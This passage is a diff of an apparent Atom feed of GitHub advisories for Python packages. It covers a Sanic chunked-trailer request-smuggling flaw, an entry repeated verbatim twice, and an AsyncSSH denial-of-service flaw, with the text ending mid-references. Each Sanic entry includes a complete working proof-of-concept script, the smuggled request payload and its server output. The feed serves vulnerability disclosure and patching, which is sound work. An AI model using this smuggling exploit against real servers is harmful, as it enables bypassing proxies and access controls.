@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-09-17T10:15:34.324Z</updated>
+    <updated>2026-09-17T15:03:17.282Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,739 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[sanic] sanic chunked trailer request smuggling allows hidden second request execution]]></title>
+        <id>https://github.com/advisories/GHSA-wmj6-g64g-j7q5</id>
+        <link href="https://github.com/advisories/GHSA-wmj6-g64g-j7q5"/>
+        <updated>2026-09-17T14:59:18.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="description">Description</h2>
+<p>Sanic's HTTP/1.1 chunked-body handling does not fully consume the <code>trailer-part</code> after the terminating <code>0\r\n</code> chunk. Because of that, attacker-controlled bytes left in the connection buffer after the first chunked request can be interpreted as the start of a new HTTP request on the same keep-alive connection. In the attached verified proof, a single outer <code>POST /</code> request that correctly returns <code>405 Method Not Allowed</code> is followed, within the same TCP send, by a hidden second request smuggled through the chunked trailer area. Sanic parses and executes that second request as a real independent request.</p>
+<p>The issue is a request-boundary integrity failure in Sanic's core HTTP/1.1 parser. The verified impact is not speculative. The attached proof shows that one TCP payload produces two server responses: first the expected <code>405</code> for the outer <code>POST /</code>, then a separate <code>200 OK</code> for a hidden <code>GET /</code>. A second exploit variant changes the hidden request path and receives a real <code>404 Not Found</code>, proving that the hidden second request is not a hard-coded artifact but an actually routed backend request. A control case with a two-character trailer field name shifts the leftover bytes from <code>GET</code> to <code>:GET</code>, which changes the second response accordingly and confirms that the root cause is incorrect trailer consumption rather than legitimate pipelining.</p>
+<h2 id="steps-to-reproduce">Steps To Reproduce</h2>
+<ol>
+<li>Start a Sanic HTTP/1.1 service on a keep-alive connection path. In the verified run, the local target listened on <code>127.0.0.1:9381</code> and the root route allowed <code>GET /</code> but not <code>POST /</code>.</li>
+<li>From the package root, run the provided PoC:</li>
+</ol>
+<pre><code class="language-bash">python3 evidence/vuln_001_chunked_trailer_smuggle.py | tee evidence/vuln_001_chunked_trailer_smuggle.run.txt
+</code></pre>
+<ol start="3">
+<li>Review the baseline case in <code>evidence/vuln_001_chunked_trailer_smuggle.run.txt</code>. A normal chunked request with <code>0\r\n\r\n</code> returns exactly one response block:</li>
+</ol>
+<pre><code class="language-text">=== CASE: baseline_no_trailer ===
+Received response blocks: 1
+HTTP/1.1 405 Method Not Allowed
+</code></pre>
+<ol start="4">
+<li>Review the exploit case that hides <code>GET /</code> in the trailer area:</li>
+</ol>
+<pre><code class="language-text">=== CASE: exploit_smuggled_root ===
+</code></pre>
+<p>The PoC sends a single TCP payload containing:</p>
+<pre><code class="language-text">POST / HTTP/1.1
+Host: 127.0.0.1:9381
+Connection: keep-alive
+Transfer-Encoding: chunked
+
+1
+X
+0
+a:GET / HTTP/1.1
+Host: 127.0.0.1:9381
+</code></pre>
+<ol start="5">
+<li>Confirm that Sanic returns two response blocks from that one send:</li>
+</ol>
+<pre><code class="language-text">Received response blocks: 2
+HTTP/1.1 405 Method Not Allowed
+...
+HTTP/1.1 200 OK
+...
+{"test":true}
+</code></pre>
+<ol start="6">
+<li>Review the second exploit case that changes the smuggled request path to a nonexistent route:</li>
+</ol>
+<pre><code class="language-text">=== CASE: exploit_smuggled_404 ===
+</code></pre>
+<p>Confirm that Sanic again returns two response blocks and that the second response is a real routed <code>404 Not Found</code> for the attacker-controlled hidden path.
+7. Review the control case with a two-character trailer field name:</p>
+<pre><code class="language-text">=== CASE: offset_control_two_char_field_name ===
+</code></pre>
+<p>Confirm that the second request is now interpreted as <code>:GET /</code>, producing a second <code>405</code> with <code>Method :GET not allowed for URL /</code>. This demonstrates that the leftover bytes begin at a parser offset inside the trailer region and are then reinterpreted as a new request line.</p>
+<h2 id="recommendations">Recommendations</h2>
+<p>After parsing the terminating <code>0</code> chunk, Sanic must continue parsing and fully consuming the <code>trailer-part</code> until the final empty line before the connection buffer is reused. If trailer support is not intended, the safer behavior is to reject any request that contains bytes after the terminating <code>0\r\n</code> other than the expected final empty line, and then close the connection instead of keeping it alive.</p>
+<p>Add regression coverage for all three cases shown in the evidence: a normal <code>0\r\n\r\n</code> chunked termination, a legal trailer that must be fully consumed, and a malicious trailer that must never cause a second backend request to be parsed. The fix needs to guarantee that no bytes from trailer processing can remain in the buffer as a candidate next request.</p>
+<h2 id="poc">poc</h2>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""Proof of concept for HTTP/1.1 chunked trailer request injection."""
+
+from __future__ import annotations
+
+import socket
+from dataclasses import dataclass
+from typing import Iterable
+
+
+TARGET = "sanic-org/sanic"
+BASE_URL = "http://127.0.0.1:9381"
+HOST = "127.0.0.1"
+PORT = 9381
+TIMEOUT = 1.0
+PROXY = None
+AUTH_HEADERS: dict[str, str] = {}
+
+
+@dataclass
+class Case:
+    name: str
+    payload: bytes
+    expected_responses: int
+    expected_markers: tuple[bytes, ...]
+
+
+def build_prefix() -&gt; bytes:
+    return (
+        b"POST / HTTP/1.1\r\n"
+        + f"Host: {HOST}:{PORT}\r\n".encode()
+        + b"Connection: keep-alive\r\n"
+        + b"Transfer-Encoding: chunked\r\n"
+        + b"\r\n"
+        + b"1\r\n"
+        + b"X\r\n"
+    )
+
+
+def build_case_payload(path: str | None = None, field_name: str = "a") -&gt; bytes:
+    prefix = build_prefix()
+    if path is None:
+        return prefix + b"0\r\n\r\n"
+    return (
+        prefix
+        + b"0\r\n"
+        + f"{field_name}:GET {path} HTTP/1.1\r\n".encode()
+        + f"Host: {HOST}:{PORT}\r\n".encode()
+        + b"\r\n"
+    )
+
+
+def send_payload(payload: bytes) -&gt; bytes:
+    response = bytearray()
+    with socket.create_connection((HOST, PORT), timeout=3) as sock:
+        sock.sendall(payload)
+        sock.settimeout(TIMEOUT)
+        while True:
+            try:
+                chunk = sock.recv(4096)
+            except TimeoutError:
+                break
+            if not chunk:
+                break
+            response.extend(chunk)
+    return bytes(response)
+
+
+def count_http_responses(response: bytes) -&gt; int:
+    return response.count(b"HTTP/1.1 ")
+
+
+def ensure_markers(case: Case, response: bytes) -&gt; None:
+    actual_count = count_http_responses(response)
+    if actual_count != case.expected_responses:
+        raise SystemExit(
+            f"[FAIL] {case.name}: expected {case.expected_responses} responses, got {actual_count}"
+        )
+    for marker in case.expected_markers:
+        if marker not in response:
+            raise SystemExit(
+                f"[FAIL] {case.name}: missing marker {marker.decode('latin1', 'replace')}"
+            )
+
+
+def render_payload(payload: bytes) -&gt; str:
+    return payload.decode("latin1", "replace")
+
+
+def render_response(response: bytes) -&gt; str:
+    return response.decode("latin1", "replace")
+
+
+def iter_cases() -&gt; Iterable[Case]:
+    yield Case(
+        name="baseline_no_trailer",
+        payload=build_case_payload(),
+        expected_responses=1,
+        expected_markers=(
+            b"HTTP/1.1 405 Method Not Allowed",
+            b"Method POST not allowed for URL /",
+        ),
+    )
+    yield Case(
+        name="exploit_smuggled_root",
+        payload=build_case_payload("/"),
+        expected_responses=2,
+        expected_markers=(
+            b"HTTP/1.1 405 Method Not Allowed",
+            b"HTTP/1.1 200 OK",
+            b'{"test":true}',
+        ),
+    )
+    yield Case(
+        name="exploit_smuggled_404",
+        payload=build_case_payload("/this-path-should-not-exist"),
+        expected_responses=2,
+        expected_markers=(
+            b"HTTP/1.1 405 Method Not Allowed",
+            b"HTTP/1.1 404 Not Found",
+            b"Requested URL /this-path-should-not-exist not found",
+        ),
+    )
+    yield Case(
+        name="offset_control_two_char_field_name",
+        payload=build_case_payload("/", field_name="ab"),
+        expected_responses=2,
+        expected_markers=(
+            b"HTTP/1.1 405 Method Not Allowed",
+            b"Method :GET not allowed for URL /",
+        ),
+    )
+
+
+def main() -&gt; None:
+    print(f"Target: {TARGET}")
+    print(f"Base URL: {BASE_URL}")
+    print()
+    for case in iter_cases():
+        print(f"=== CASE: {case.name} ===")
+        print("Sent payload:")
+        print(render_payload(case.payload))
+        response = send_payload(case.payload)
+        ensure_markers(case, response)
+        print(f"Received response blocks: {count_http_responses(response)}")
+        print("Raw response:")
+        print(render_response(response))
+        print("[OK] Case verified")
+        print()
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<h2 id="evidence-files">Evidence Files</h2>
+<p>The attachment package includes the exact PoC and the full runtime output from the verified local execution.</p>
+<ul>
+<li><code>evidence/vuln_001_chunked_trailer_smuggle.py</code>: full PoC used for the verified run.</li>
+<li><code>evidence/vuln_001_chunked_trailer_smuggle.run.txt</code>: runtime output showing the baseline behavior, the successful smuggled <code>GET /</code> execution, the successful smuggled <code>GET /this-path-should-not-exist</code> execution, and the trailer-offset control case.</li>
+</ul>
+<p>Observed baseline behavior:</p>
+<pre><code class="language-text">=== CASE: baseline_no_trailer ===
+Received response blocks: 1
+Raw response:
+HTTP/1.1 405 Method Not Allowed
+...
+Method POST not allowed for URL /
+</code></pre>
+<p>Observed hidden second request execution:</p>
+<pre><code class="language-text">=== CASE: exploit_smuggled_root ===
+Received response blocks: 2
+Raw response:
+HTTP/1.1 405 Method Not Allowed
+...
+Method POST not allowed for URL /
+
+HTTP/1.1 200 OK
+...
+{"test":true}
+</code></pre>
+<p>Observed hidden attacker-controlled path execution:</p>
+<pre><code class="language-text">=== CASE: exploit_smuggled_404 ===
+Received response blocks: 2
+Raw response:
+HTTP/1.1 405 Method Not Allowed
+...
+Method POST not allowed for URL /
+
+HTTP/1.1 404 Not Found
+...
+Requested URL /this-path-should-not-exist not found
+</code></pre>
+<p>Observed trailer-offset control:</p>
+<pre><code class="language-text">=== CASE: offset_control_two_char_field_name ===
+Received response blocks: 2
+Raw response:
+HTTP/1.1 405 Method Not Allowed
+...
+Method POST not allowed for URL /
+
+HTTP/1.1 405 Method Not Allowed
+...
+Method :GET not allowed for URL /
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An attacker who can send a chunked HTTP/1.1 request to a Sanic backend can cause the backend to interpret bytes from the trailer region as a second request on the same keep-alive connection. In the verified proof, that second request was fully routed and executed by the backend even though only one outer request was sent by the client.</p>
+<p>This breaks the integrity of HTTP request boundaries inside the server. In real deployments that place Sanic behind reverse proxies, gateways, caches, or other intermediaries, a backend parser mismatch of this kind can become a request smuggling primitive with broader security consequences than the local proof route demonstrates.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sanic-org/sanic/security/advisories/GHSA-wmj6-g64g-j7q5">https://github.com/sanic-org/sanic/security/advisories/GHSA-wmj6-g64g-j7q5</a></li>
+<li><a href="https://github.com/sanic-org/sanic/pull/3164">https://github.com/sanic-org/sanic/pull/3164</a></li>
+<li><a href="https://github.com/sanic-org/sanic/pull/3165">https://github.com/sanic-org/sanic/pull/3165</a></li>
+<li><a href="https://github.com/sanic-org/sanic/commit/47349d689d65fa1907977ac100e867894aeafb22">https://github.com/sanic-org/sanic/commit/47349d689d65fa1907977ac100e867894aeafb22</a></li>
+<li><a href="https://github.com/sanic-org/sanic/commit/69a10d3b06babaa9e5f6d1af577364e9e53b6dea">https://github.com/sanic-org/sanic/commit/69a10d3b06babaa9e5f6d1af577364e9e53b6dea</a></li>
+<li><a href="https://github.com/sanic-org/sanic/commit/a332796506c7c588b6930b02a8886e43eb8ea8d6">https://github.com/sanic-org/sanic/commit/a332796506c7c588b6930b02a8886e43eb8ea8d6</a></li>
+<li><a href="https://github.com/sanic-org/sanic/releases/tag/v24.12.1">https://github.com/sanic-org/sanic/releases/tag/v24.12.1</a></li>
+<li><a href="https://github.com/sanic-org/sanic/releases/tag/v25.12.1">https://github.com/sanic-org/sanic/releases/tag/v25.12.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-wmj6-g64g-j7q5">https://github.com/advisories/GHSA-wmj6-g64g-j7q5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wmj6-g64g-j7q5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-17T14:59:16.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[sanic] sanic chunked trailer request smuggling allows hidden second request execution]]></title>
+        <id>https://github.com/advisories/GHSA-wmj6-g64g-j7q5</id>
+        <link href="https://github.com/advisories/GHSA-wmj6-g64g-j7q5"/>
+        <updated>2026-09-17T14:59:18.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="description">Description</h2>
+<p>Sanic's HTTP/1.1 chunked-body handling does not fully consume the <code>trailer-part</code> after the terminating <code>0\r\n</code> chunk. Because of that, attacker-controlled bytes left in the connection buffer after the first chunked request can be interpreted as the start of a new HTTP request on the same keep-alive connection. In the attached verified proof, a single outer <code>POST /</code> request that correctly returns <code>405 Method Not Allowed</code> is followed, within the same TCP send, by a hidden second request smuggled through the chunked trailer area. Sanic parses and executes that second request as a real independent request.</p>
+<p>The issue is a request-boundary integrity failure in Sanic's core HTTP/1.1 parser. The verified impact is not speculative. The attached proof shows that one TCP payload produces two server responses: first the expected <code>405</code> for the outer <code>POST /</code>, then a separate <code>200 OK</code> for a hidden <code>GET /</code>. A second exploit variant changes the hidden request path and receives a real <code>404 Not Found</code>, proving that the hidden second request is not a hard-coded artifact but an actually routed backend request. A control case with a two-character trailer field name shifts the leftover bytes from <code>GET</code> to <code>:GET</code>, which changes the second response accordingly and confirms that the root cause is incorrect trailer consumption rather than legitimate pipelining.</p>
+<h2 id="steps-to-reproduce">Steps To Reproduce</h2>
+<ol>
+<li>Start a Sanic HTTP/1.1 service on a keep-alive connection path. In the verified run, the local target listened on <code>127.0.0.1:9381</code> and the root route allowed <code>GET /</code> but not <code>POST /</code>.</li>
+<li>From the package root, run the provided PoC:</li>
+</ol>
+<pre><code class="language-bash">python3 evidence/vuln_001_chunked_trailer_smuggle.py | tee evidence/vuln_001_chunked_trailer_smuggle.run.txt
+</code></pre>
+<ol start="3">
+<li>Review the baseline case in <code>evidence/vuln_001_chunked_trailer_smuggle.run.txt</code>. A normal chunked request with <code>0\r\n\r\n</code> returns exactly one response block:</li>
+</ol>
+<pre><code class="language-text">=== CASE: baseline_no_trailer ===
+Received response blocks: 1
+HTTP/1.1 405 Method Not Allowed
+</code></pre>
+<ol start="4">
+<li>Review the exploit case that hides <code>GET /</code> in the trailer area:</li>
+</ol>
+<pre><code class="language-text">=== CASE: exploit_smuggled_root ===
+</code></pre>
+<p>The PoC sends a single TCP payload containing:</p>
+<pre><code class="language-text">POST / HTTP/1.1
+Host: 127.0.0.1:9381
+Connection: keep-alive
+Transfer-Encoding: chunked
+
+1
+X
+0
+a:GET / HTTP/1.1
+Host: 127.0.0.1:9381
+</code></pre>
+<ol start="5">
+<li>Confirm that Sanic returns two response blocks from that one send:</li>
+</ol>
+<pre><code class="language-text">Received response blocks: 2
+HTTP/1.1 405 Method Not Allowed
+...
+HTTP/1.1 200 OK
+...
+{"test":true}
+</code></pre>
+<ol start="6">
+<li>Review the second exploit case that changes the smuggled request path to a nonexistent route:</li>
+</ol>
+<pre><code class="language-text">=== CASE: exploit_smuggled_404 ===
+</code></pre>
+<p>Confirm that Sanic again returns two response blocks and that the second response is a real routed <code>404 Not Found</code> for the attacker-controlled hidden path.
+7. Review the control case with a two-character trailer field name:</p>
+<pre><code class="language-text">=== CASE: offset_control_two_char_field_name ===
+</code></pre>
+<p>Confirm that the second request is now interpreted as <code>:GET /</code>, producing a second <code>405</code> with <code>Method :GET not allowed for URL /</code>. This demonstrates that the leftover bytes begin at a parser offset inside the trailer region and are then reinterpreted as a new request line.</p>
+<h2 id="recommendations">Recommendations</h2>
+<p>After parsing the terminating <code>0</code> chunk, Sanic must continue parsing and fully consuming the <code>trailer-part</code> until the final empty line before the connection buffer is reused. If trailer support is not intended, the safer behavior is to reject any request that contains bytes after the terminating <code>0\r\n</code> other than the expected final empty line, and then close the connection instead of keeping it alive.</p>
+<p>Add regression coverage for all three cases shown in the evidence: a normal <code>0\r\n\r\n</code> chunked termination, a legal trailer that must be fully consumed, and a malicious trailer that must never cause a second backend request to be parsed. The fix needs to guarantee that no bytes from trailer processing can remain in the buffer as a candidate next request.</p>
+<h2 id="poc">poc</h2>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""Proof of concept for HTTP/1.1 chunked trailer request injection."""
+
+from __future__ import annotations
+
+import socket
+from dataclasses import dataclass
+from typing import Iterable
+
+
+TARGET = "sanic-org/sanic"
+BASE_URL = "http://127.0.0.1:9381"
+HOST = "127.0.0.1"
+PORT = 9381
+TIMEOUT = 1.0
+PROXY = None
+AUTH_HEADERS: dict[str, str] = {}
+
+
+@dataclass
+class Case:
+    name: str
+    payload: bytes
+    expected_responses: int
+    expected_markers: tuple[bytes, ...]
+
+
+def build_prefix() -&gt; bytes:
+    return (
+        b"POST / HTTP/1.1\r\n"
+        + f"Host: {HOST}:{PORT}\r\n".encode()
+        + b"Connection: keep-alive\r\n"
+        + b"Transfer-Encoding: chunked\r\n"
+        + b"\r\n"
+        + b"1\r\n"
+        + b"X\r\n"
+    )
+
+
+def build_case_payload(path: str | None = None, field_name: str = "a") -&gt; bytes:
+    prefix = build_prefix()
+    if path is None:
+        return prefix + b"0\r\n\r\n"
+    return (
+        prefix
+        + b"0\r\n"
+        + f"{field_name}:GET {path} HTTP/1.1\r\n".encode()
+        + f"Host: {HOST}:{PORT}\r\n".encode()
+        + b"\r\n"
+    )
+
+
+def send_payload(payload: bytes) -&gt; bytes:
+    response = bytearray()
+    with socket.create_connection((HOST, PORT), timeout=3) as sock:
+        sock.sendall(payload)
+        sock.settimeout(TIMEOUT)
+        while True:
+            try:
+                chunk = sock.recv(4096)
+            except TimeoutError:
+                break
+            if not chunk:
+                break
+            response.extend(chunk)
+    return bytes(response)
+
+
+def count_http_responses(response: bytes) -&gt; int:
+    return response.count(b"HTTP/1.1 ")
+
+
+def ensure_markers(case: Case, response: bytes) -&gt; None:
+    actual_count = count_http_responses(response)
+    if actual_count != case.expected_responses:
+        raise SystemExit(
+            f"[FAIL] {case.name}: expected {case.expected_responses} responses, got {actual_count}"
+        )
+    for marker in case.expected_markers:
+        if marker not in response:
+            raise SystemExit(
+                f"[FAIL] {case.name}: missing marker {marker.decode('latin1', 'replace')}"
+            )
+
+
+def render_payload(payload: bytes) -&gt; str:
+    return payload.decode("latin1", "replace")
+
+
+def render_response(response: bytes) -&gt; str:
+    return response.decode("latin1", "replace")
+
+
+def iter_cases() -&gt; Iterable[Case]:
+    yield Case(
+        name="baseline_no_trailer",
+        payload=build_case_payload(),
+        expected_responses=1,
+        expected_markers=(
+            b"HTTP/1.1 405 Method Not Allowed",
+            b"Method POST not allowed for URL /",
+        ),
+    )
+    yield Case(
+        name="exploit_smuggled_root",
+        payload=build_case_payload("/"),
+        expected_responses=2,
+        expected_markers=(
+            b"HTTP/1.1 405 Method Not Allowed",
+            b"HTTP/1.1 200 OK",
+            b'{"test":true}',
+        ),
+    )
+    yield Case(
+        name="exploit_smuggled_404",
+        payload=build_case_payload("/this-path-should-not-exist"),
+        expected_responses=2,
+        expected_markers=(
+            b"HTTP/1.1 405 Method Not Allowed",
+            b"HTTP/1.1 404 Not Found",
+            b"Requested URL /this-path-should-not-exist not found",
+        ),
+    )
+    yield Case(
+        name="offset_control_two_char_field_name",
+        payload=build_case_payload("/", field_name="ab"),
+        expected_responses=2,
+        expected_markers=(
+            b"HTTP/1.1 405 Method Not Allowed",
+            b"Method :GET not allowed for URL /",
+        ),
+    )
+
+
+def main() -&gt; None:
+    print(f"Target: {TARGET}")
+    print(f"Base URL: {BASE_URL}")
+    print()
+    for case in iter_cases():
+        print(f"=== CASE: {case.name} ===")
+        print("Sent payload:")
+        print(render_payload(case.payload))
+        response = send_payload(case.payload)
+        ensure_markers(case, response)
+        print(f"Received response blocks: {count_http_responses(response)}")
+        print("Raw response:")
+        print(render_response(response))
+        print("[OK] Case verified")
+        print()
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<h2 id="evidence-files">Evidence Files</h2>
+<p>The attachment package includes the exact PoC and the full runtime output from the verified local execution.</p>
+<ul>
+<li><code>evidence/vuln_001_chunked_trailer_smuggle.py</code>: full PoC used for the verified run.</li>
+<li><code>evidence/vuln_001_chunked_trailer_smuggle.run.txt</code>: runtime output showing the baseline behavior, the successful smuggled <code>GET /</code> execution, the successful smuggled <code>GET /this-path-should-not-exist</code> execution, and the trailer-offset control case.</li>
+</ul>
+<p>Observed baseline behavior:</p>
+<pre><code class="language-text">=== CASE: baseline_no_trailer ===
+Received response blocks: 1
+Raw response:
+HTTP/1.1 405 Method Not Allowed
+...
+Method POST not allowed for URL /
+</code></pre>
+<p>Observed hidden second request execution:</p>
+<pre><code class="language-text">=== CASE: exploit_smuggled_root ===
+Received response blocks: 2
+Raw response:
+HTTP/1.1 405 Method Not Allowed
+...
+Method POST not allowed for URL /
+
+HTTP/1.1 200 OK
+...
+{"test":true}
+</code></pre>
+<p>Observed hidden attacker-controlled path execution:</p>
+<pre><code class="language-text">=== CASE: exploit_smuggled_404 ===
+Received response blocks: 2
+Raw response:
+HTTP/1.1 405 Method Not Allowed
+...
+Method POST not allowed for URL /
+
+HTTP/1.1 404 Not Found
+...
+Requested URL /this-path-should-not-exist not found
+</code></pre>
+<p>Observed trailer-offset control:</p>
+<pre><code class="language-text">=== CASE: offset_control_two_char_field_name ===
+Received response blocks: 2
+Raw response:
+HTTP/1.1 405 Method Not Allowed
+...
+Method POST not allowed for URL /
+
+HTTP/1.1 405 Method Not Allowed
+...
+Method :GET not allowed for URL /
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An attacker who can send a chunked HTTP/1.1 request to a Sanic backend can cause the backend to interpret bytes from the trailer region as a second request on the same keep-alive connection. In the verified proof, that second request was fully routed and executed by the backend even though only one outer request was sent by the client.</p>
+<p>This breaks the integrity of HTTP request boundaries inside the server. In real deployments that place Sanic behind reverse proxies, gateways, caches, or other intermediaries, a backend parser mismatch of this kind can become a request smuggling primitive with broader security consequences than the local proof route demonstrates.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sanic-org/sanic/security/advisories/GHSA-wmj6-g64g-j7q5">https://github.com/sanic-org/sanic/security/advisories/GHSA-wmj6-g64g-j7q5</a></li>
+<li><a href="https://github.com/sanic-org/sanic/pull/3164">https://github.com/sanic-org/sanic/pull/3164</a></li>
+<li><a href="https://github.com/sanic-org/sanic/pull/3165">https://github.com/sanic-org/sanic/pull/3165</a></li>
+<li><a href="https://github.com/sanic-org/sanic/commit/47349d689d65fa1907977ac100e867894aeafb22">https://github.com/sanic-org/sanic/commit/47349d689d65fa1907977ac100e867894aeafb22</a></li>
+<li><a href="https://github.com/sanic-org/sanic/commit/69a10d3b06babaa9e5f6d1af577364e9e53b6dea">https://github.com/sanic-org/sanic/commit/69a10d3b06babaa9e5f6d1af577364e9e53b6dea</a></li>
+<li><a href="https://github.com/sanic-org/sanic/commit/a332796506c7c588b6930b02a8886e43eb8ea8d6">https://github.com/sanic-org/sanic/commit/a332796506c7c588b6930b02a8886e43eb8ea8d6</a></li>
+<li><a href="https://github.com/sanic-org/sanic/releases/tag/v24.12.1">https://github.com/sanic-org/sanic/releases/tag/v24.12.1</a></li>
+<li><a href="https://github.com/sanic-org/sanic/releases/tag/v25.12.1">https://github.com/sanic-org/sanic/releases/tag/v25.12.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-wmj6-g64g-j7q5">https://github.com/advisories/GHSA-wmj6-g64g-j7q5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wmj6-g64g-j7q5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-17T14:59:16.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[asyncssh] AsyncSSH: asyncio event-loop freeze via SSH maximum packet size = 0 in SSH_MSG_CHANNEL_OPEN / OPEN_CONFIRMATION]]></title>
+        <id>https://github.com/advisories/GHSA-rw4j-r22c-9gc3</id>
+        <link href="https://github.com/advisories/GHSA-rw4j-r22c-9gc3"/>
+        <updated>2026-09-17T14:53:03.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A malicious SSH server can wedge an AsyncSSH <strong>client</strong>, and an authenticated
+client can wedge an AsyncSSH <strong>server</strong>, by sending a channel <code>maximum packet size</code> of <code>0</code> in <code>SSH_MSG_CHANNEL_OPEN_CONFIRMATION</code> (server→client) or
+<code>SSH_MSG_CHANNEL_OPEN</code> (client→server). AsyncSSH stores the peer-supplied value
+verbatim with no lower-bound check; the first time channel data is written,
+<code>SSHChannel._flush_send_buf</code> enters a <strong>synchronous infinite loop</strong> that cannot
+be interrupted by <code>asyncio.wait_for</code> or any timeout. The loop body has no
+<code>await</code>, so it blocks the entire asyncio event loop — for a server, one
+malicious authenticated channel freezes <strong>all</strong> current and future connections.</p>
+<p>RFC 4254 §5.1 leaves receiver behavior for a peer-reported "maximum packet
+size = 0" undefined, so the value must be rejected rather than stored.</p>
+<h2 id="root-cause">Root cause</h2>
+<p><code>asyncssh/channel.py</code>:</p>
+<pre><code class="language-python"># process_open (server side)        -- line 465
+self._send_pktsize = send_pktsize    # peer value, no &gt;= 1 check
+
+# process_open_confirmation (client) -- line 528
+self._send_pktsize = send_pktsize    # peer value, no &gt;= 1 check
+
+# _flush_send_buf                    -- lines 305-320
+while self._send_buf and self._send_window:
+    pktsize = min(self._send_window, self._send_pktsize)  # 0 when peer sends 0
+    buf, datatype = self._send_buf[0]
+    if len(buf) &gt; pktsize:          # True for any buffered data
+        data = buf[:pktsize]        # empty (b'')
+        del buf[:pktsize]           # no-op
+    ...
+    self._send_window -= len(data)  # -= 0, unchanged
+</code></pre>
+<p>With <code>_send_pktsize == 0</code>, <code>pktsize</code> is <code>0</code>, so <code>buf[:0]</code> is empty,
+<code>del buf[:0]</code> is a no-op, and <code>_send_window</code> is never decremented — the
+<code>while</code> condition is permanently true, and with no <code>await</code> in the body the
+event loop is blocked.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Client vector (primary):</strong> a malicious SSH server replies to the client's
+channel open with <code>maximum packet size = 0</code>; the client wedges on its first
+channel write. The attacker is the server, so it needs no valid credentials.</li>
+<li><strong>Server vector:</strong> an authenticated client opens a channel with
+<code>maximum packet size = 0</code>; any server-side channel write wedges the AsyncSSH
+server's event loop, freezing <strong>every</strong> current and future connection. A
+single low-privilege account can take the whole server down.</li>
+</ul>
+<p>Both vectors are a single SSH message, deterministic, and cause total
+availability loss for the affected process.</p>
+<h2 id="affected-versions">Affected versions</h2>
+<p>&lt;= 2.23.1 (latest release, 2026-06-06); also present on <code>master</code>
+(channel.py:465/528 unguarded). Verified end-to-end on 2.23.1.</p>
+<h2 id="verification">Verification</h2>
+<p>The maintainer's proposed fix (reject <code>send_pktsize == 0</code> in <code>connection.py</code>
+<code>_process_channel_open</code> / <code>_process_channel_open_confirmation</code>) was applied to
+2.23.1 and re-tested end-to-end over TCP:</p>
+<ul>
+<li><strong>Unpatched:</strong> malicious server (paramiko forcing <code>max_packet_size=0</code> in
+OPEN_CONFIRMATION) + real asyncssh client → client event loop wedges.</li>
+<li><strong>Patched:</strong> the guard fires inside <code>_process_channel_open_confirmation</code>, the
+malicious value is rejected, the connection closes cleanly
+(<code>ChannelOpenError: SSH connection closed</code>), and the client does <strong>not</strong> wedge.</li>
+</ul>
+<p>The maintainer (Ron Frederick) independently confirmed the freeze and noted that
+<strong>even shutting the server down does not break clients out of the loop</strong>.</p>
+<p>Reproducers available: a focused harness driving the real
+<code>SSHChannel._flush_send_buf</code> with <code>_send_pktsize=0</code>, and an end-to-end
+<code>malicious_server.py</code> (paramiko) + <code>client.py</code> (real asyncssh) pair. The
+end-to-end client repro uses <code>asyncio.new_event_loop()</code> (not <code>get_event_loop()</code>)
+for Python 3.14 compatibility.</p>
+<h2 id="suggested-fix-maintainers-approach">Suggested fix (maintainer's approach)</h2>
+<p>In <code>connection.py</code>, after each <code>send_pktsize = packet.get_uint32()</code> in
+<code>_process_channel_open</code> and <code>_process_channel_open_confirmation</code>:</p>
+<pre><code class="language-python">if send_pktsize == 0:
+    raise ProtocolError('Invalid maximum packet size')
+</code></pre>
+<h2 id="cvss">CVSS</h2>
+<p><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code> (6.5 Medium). An earlier draft
+quoted 7.5 High ("100% CPU"); the synchronous loop burns ~100% of one core's
+worth of CPU but, being single-threaded, the OS scheduler spreads it across
+cores, so the real impact is event-loop / connection freeze, not machine-wide
+CPU exhaustion.</p>
+<h2 id="references">References</h2>
+<ul>
+<li>RFC 4254 §5.1 (channel "maximum packet size"; behavior for 0 is undefined).</li>
+<li>The same <code>maximum packet size = 0</code> send-loop wedge was confirmed in several
+other independent SSH implementations (different languages/runtimes) and
+reported to each maintainer separately.</li>
+</ul>
+<h2 id="credits">Credits</h2>
+<p>Reported by zhangph (afldl), 2026-06-20.</p>
+<pre><code>### References
+
+- &lt;https://github.com/ronf/asyncssh/security/advisories/GHSA-rw4j-r22c-9gc3&gt;
+- &lt;https://nvd.nist.gov/vuln/detail/CVE-2026-62949&gt;
+- &lt;https://github.com/ronf/asyncssh/commit/756cbae5350789ce9735f15f704bae9b5a3608b8&gt;
